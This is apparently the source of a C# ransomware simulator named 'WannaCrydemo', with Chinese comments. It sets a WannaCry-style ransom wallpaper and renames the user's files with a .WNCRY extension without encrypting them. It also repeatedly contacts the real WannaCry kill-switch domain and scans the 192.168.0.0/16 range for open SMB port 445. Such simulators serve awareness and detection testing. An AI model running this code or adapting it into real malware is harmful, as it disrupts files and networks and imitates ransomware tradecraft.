using System;
using System.IO;
using System.Net.Http;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Runtime.InteropServices;


namespace WannaCrydemo
{
    internal static class Program
    {
        private static System.Threading.Timer httpTimer;
        private static bool isTimerActive = false;
        private static CancellationTokenSource cancellationTokenSource;

        [STAThread]
        static void Main()
        {
            try
            {
                ExtractFile();
                ChangeWallPaper();
                UpdateExtension();

                // 使用 System.Threading.Timer 设置每15秒执行一次HTTP请求
                httpTimer = new System.Threading.Timer(OnTimerCallback, null, TimeSpan.Zero, TimeSpan.FromSeconds(15));

                Application.EnableVisualStyles();
                Application.SetCompatibleTextRenderingDefault(false);

                // 在后台线程执行端口扫描
                Task.Run(() => ScanPorts());
                // 在主线程中运行窗体
                Application.Run(new Form1());
            }
            finally
            {
                // 在应用程序退出时释放 Timer 和 CancellationTokenSource
                httpTimer?.Dispose();
                cancellationTokenSource?.Dispose();
            }
        }

        //更换壁纸
        [DllImport("user32.dll", EntryPoint = "SystemParametersInfo")]
        public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
        public static void ChangeWallPaper()
        {
            string bmpPath = @".\wallpaper\WanaDecryptor.bmp";
            SystemParametersInfo(20, 1, bmpPath, 0x1 | 0x2);
            //删除释放的文件
            DirectoryInfo di = new DirectoryInfo(@".\wallpaper");
            di.Delete(true);
        }

        //释放壁纸文件到wallpaper目录
        private static void ExtractFile()
        {
            string sPath = @".\wallpaper";
            if (!Directory.Exists(sPath))
            {
                Directory.CreateDirectory(sPath);
            }
            string path = @".\wallpaper\WanaDecryptor.bmp";

            using (MemoryStream memoryStream = new MemoryStream())
            {
                Properties.Resources.WanaDecryptor.Save(memoryStream, Properties.Resources.WanaDecryptor.RawFormat);
                byte[] data = memoryStream.ToArray();

                using (FileStream file = new FileStream(path, FileMode.Create))
                {
                    file.Write(data, 0, data.Length);
                }
            }
        }

        //修改文件扩展为.WNCRY
        static void UpdateExtension()
        {
            string path = Directory.GetCurrentDirectory();

            DirectoryInfo dir = new DirectoryInfo(path);
            FileInfo[] files = dir.GetFiles("*.*", SearchOption.TopDirectoryOnly);
            for (int i = 0; i < files.Length; i++)
            {
                bool isContain = (files[i].FullName.Contains(".exe") || files[i].FullName.Contains(".WNCRY"));

                if (!isContain)
                {
                    // 在文件移动之前，检查目标文件是否存在，以避免覆盖已存在的文件
                    string destinationPath = Path.ChangeExtension(files[i].FullName, files[i].Extension + ".WNCRY");
                    if (!File.Exists(destinationPath))
                    {
                        files[i].MoveTo(destinationPath);
                    }
                }
            }
        }

        // 异步模拟HTTP请求WannaCry的域名
        public static async Task SimulateWannaCryRequestAsync(CancellationToken cancellationToken)
        {
            string maliciousDomain = "www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com";

            using (HttpClient client = new HttpClient())
            {
                try
                {
                    HttpResponseMessage response = await client.GetAsync("http://" + maliciousDomain, cancellationToken);

                    if (response.IsSuccessStatusCode)
                    {
                        // 处理成功的情况
                        Console.WriteLine($"Simulated request to {maliciousDomain}. Response: {response.StatusCode}");
                    }
                    else
                    {
                        // 处理非成功的情况
                        Console.WriteLine($"Error: Simulated request to {maliciousDomain} failed with status code {response.StatusCode}");
                    }
                }
                catch (HttpRequestException ex)
                {
                    // 处理HTTP请求失败的情况
                    Console.WriteLine($"HTTP request to {maliciousDomain} failed: {ex.ToString()}");
                }
                catch (Exception ex)
                {
                    // 处理其他异常情况
                    Console.WriteLine($"Error occurred while simulating request to {maliciousDomain}: {ex.ToString()}");
                }
            }
        }

        private static void OnTimerCallback(object state)
        {
            if (!isTimerActive)
            {
                isTimerActive = true;

                cancellationTokenSource = new CancellationTokenSource();
                Task.Run(async () =>
                {
                    await SimulateWannaCryRequestAsync(cancellationTokenSource.Token);
                    isTimerActive = false;
                });
            }
        }

        // 对192.168.0.0/16进行445端口扫描
        public static void ScanPorts()
        {
            string baseIp = "192.168.";
            int startRange1 = 0;
            int endRange1 = 255;
            int startRange2 = 0;
            int endRange2 = 255;
            int portToScan = 445;
            int numberOfScans = 10000; // 你可以调整扫描的次数

            Console.WriteLine($"正在对 {numberOfScans} 个随机 IP 进行端口 {portToScan} 扫描...");

            Random random = new Random();

            for (int scanCount = 1; scanCount <= numberOfScans; scanCount++)
            {
                int randomIp1 = random.Next(startRange1, endRange1 + 1);
                int randomIp2 = random.Next(startRange2, endRange2 + 1);

                string ipAddress = $"{baseIp}{randomIp1}.{randomIp2}";

                if (IsPortOpen(ipAddress, portToScan))
                {
                    Console.WriteLine($"端口 {portToScan} 在 {ipAddress} 处于开放状态。");
                }
            }

            Console.WriteLine("扫描完成。");
        }

        public static bool IsPortOpen(string ipAddress, int port)
        {
            using (TcpClient tcpClient = new TcpClient())
            {
                try
                {
                    tcpClient.Connect(ipAddress, port);
                    return true;    
                }
                catch (Exception)
                {
                    return false;
                }
            }
        }
    }
}
